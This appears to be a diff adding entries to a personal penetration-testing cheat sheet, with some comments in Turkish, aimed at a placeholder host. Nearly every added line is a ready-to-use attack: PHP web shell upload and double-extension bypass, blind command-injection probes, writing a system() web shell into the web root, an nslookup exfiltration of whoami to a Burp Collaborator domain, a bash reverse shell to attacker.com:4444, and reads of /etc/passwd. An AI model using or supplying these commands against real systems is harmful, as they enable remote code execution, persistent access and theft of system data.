@@ -884,3 +884,76 @@ curl https://example.com/api/v1/config
 curl https://example.com/api/whoami \
   -H "X-Forwarded-For: 127.0.0.1" \
   -H "X-Real-IP: 127.0.0.1"
+============================================================================================
+GENEL
+
+curl -X POST "https://example.com/upload" \
+  -H "Cookie: SESSION=$SESSION; token=$TOKEN" \
+  -F "file=@shell.php"
+
+# Access shell
+curl "https://example.com/uploads/shell.php?c=whoami"
+curl "https://example.com/uploads/shell.php?c=cat%20/etc/passwd"
+
+
+# Double extension bypass
+mv shell.php shell.jpg.php
+===================================================================================================
+Time-Based Blind Test
+
+# Test 2: 10 saniye gecikme
+time curl -X POST https://example.com/api \
+  -d "cmd=id; sleep 10" \
+  -w "\nTotal time: %{time_total}s\n" \
+  --max-time 15
+
+# Test 3: Linux ping
+time curl -X POST https://example.com/api \
+  -d "cmd=id; ping -c 10 127.0.0.1" \
+  -w "\nTotal time: %{time_total}s\n" \
+  --max-time 15
+
+# Test 4: Windows timeout
+time curl -X POST https://example.com/api \
+  -d "cmd=id & timeout 10" \
+  -w "\nTotal time: %{time_total}s\n" \
+  --max-time 15
+===================================================================================================
+# Step 1: Web root'a dosya yaz
+curl -X POST https://example.com/api \
+  -d "cmd=id; echo VULNERABLE_TEST_12345 > /var/www/html/testfile.txt"
+
+# Step 2: Dosyayı kontrol et
+curl https://example.com/testfile.txt
+===================================================================================================
+curl -X POST https://example.com/api \
+  -d "cmd=q; nslookup \`whoami\`.abc123.burpcollaborator.net"
+==================================================================================================
+curl -X POST "https://example.com/api" \
+  -d "cmd=id; echo VULNERABLE > /var/www/html/test.txt"
+  
+curl "https://example.com/test.txt"
+
+
+curl -X POST "https://example.com/api" \
+  -d "cmd=echo '<?php system(\$_GET[\"c\"]); ?>' > /var/www/html/shell.php"
+  
+curl "https://example.com/shell.php?c=whoami"
+
+curl "https://example.com/api" \
+  -d "cmd=bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"
+
+curl "https://example.com/api" \
+  -d "cmd=cat /etc/passwd > /var/www/html/p.txt"
+  
+curl "https://example.com/p.txt"
+
+# 1. Test
+curl "https://example.com/api" -d "cmd=sleep 5"  # 5s delay? VULN!
+
+# 2. Web shell
+curl "https://example.com/api" -d "cmd=echo '<?php system(\$_GET[\"c\"]); ?>' > shell.php"
+
+# 3. Use it
+curl "https://example.com/shell.php?c=whoami"
+curl "https://example.com/shell.php?c=cat /etc/passwd"
